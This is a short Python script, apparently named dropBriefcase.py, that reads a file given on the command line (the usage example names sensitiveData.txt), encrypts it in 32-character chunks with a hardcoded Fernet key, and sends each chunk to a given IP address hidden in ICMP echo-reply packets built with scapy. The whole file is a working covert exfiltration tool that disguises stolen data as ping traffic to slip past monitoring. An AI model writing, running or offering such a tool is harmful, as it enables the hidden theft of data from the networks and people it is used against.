#Example: python3 dropBriefcase.py sensitiveData.txt 192.168.253.136
from signal import pause
import sys
from time import sleep
from scapy.all import *
from Encryption import *

encryptionKey = b'fnKksPKHBtvntWwgxL8U7x1kMptOkZHe1IG52RXXhgE='

#conf.verb mutes scapys verbosity
conf.verb = 0

# Get arguments passed at command line
host = sys.argv[2]
f = open(sys.argv[1])

#Read data
data = f.read()
f.close()

print("Data size is %d characters" % len(data))

# Split data up into 32-character chunks to send payload in our new ICMP packets.
i = 0
while i < len(data):
    #Encrypt data
    f = Fernet(encryptionKey) 
    encryptedData = f.encrypt(bytes(data[i:i+32],'utf-8'))
    printObject(encryptedData,"Encrypting message") 
    
    #Create new ICMP Packet with payload
    newICMPPacket = IP(dst=host)/ICMP(type="echo-reply")/encryptedData

    #Send the data over
    send(newICMPPacket)

    #Increase i to get next 32 characters
    i = i+32
    print("Sending Data",i)
    #sleep(5)

